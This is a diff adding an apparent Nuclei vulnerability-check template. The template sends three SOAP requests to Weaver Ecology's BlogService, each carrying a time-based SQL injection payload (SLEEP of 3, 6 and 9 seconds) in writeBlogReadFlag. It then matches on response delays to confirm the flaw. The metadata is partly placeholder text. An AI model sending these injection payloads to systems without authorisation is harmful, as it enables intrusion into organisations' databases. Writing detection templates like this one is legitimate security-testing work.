@@ -1,0 +1,92 @@
+id: weaver-Ecology-BlogService-sqli-linux
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 看到别人公众号推了一篇文章，感觉这个洞也不是多能握得住了（去年挖的一个注入），利用稍微有点苛刻，新版本的ecology9 windows搭建的话没办法外部访问services接口了（只能本地），所以只能打linux搭建的，但是遗憾的是linux的ecology不是特别多。所以索性就把它放出来吧
+  reference:
+    - https://mp.weixin.qq.com/s/4mJg0FuOOIBjZn-qTMSaeA
+  tags: tags
+http:
+  - raw:
+      - |+
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Soapaction: 1
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 414
+
+        <soapenv: Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+           <soapenv: Header/>
+           <soapenv: Body>
+              <web: writeBlogReadFlag>
+                 <web: string>1</web:string>
+                 <web: string>
+                    3' AND (SELECT 3686 FROM (SELECT(SLEEP(3)))kzVQ) AND 'Wxlz'='Wxlz'
+                 </web: string>
+                 <web: string></web:string>
+              </web: writeBlogReadFlag>
+           </soapenv: Body>
+        </soapenv: Envelope>
+
+      - |+
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Soapaction: 1
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 414
+
+        <soapenv: Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+           <soapenv: Header/>
+           <soapenv: Body>
+              <web: writeBlogReadFlag>
+                 <web: string>1</web:string>
+                 <web: string>
+                    3' AND (SELECT 3686 FROM (SELECT(SLEEP(6)))kzVQ) AND 'Wxlz'='Wxlz'
+                 </web: string>
+                 <web: string></web:string>
+              </web: writeBlogReadFlag>
+           </soapenv: Body>
+        </soapenv: Envelope>
+
+      - |+
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Soapaction: 1
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 414
+
+        <soapenv: Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+           <soapenv: Header/>
+           <soapenv: Body>
+              <web: writeBlogReadFlag>
+                 <web: string>1</web:string>
+                 <web: string>
+                    3' AND (SELECT 3686 FROM (SELECT(SLEEP(9)))kzVQ) AND 'Wxlz'='Wxlz'
+                 </web: string>
+                 <web: string></web:string>
+              </web: writeBlogReadFlag>
+           </soapenv: Body>
+        </soapenv: Envelope>
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
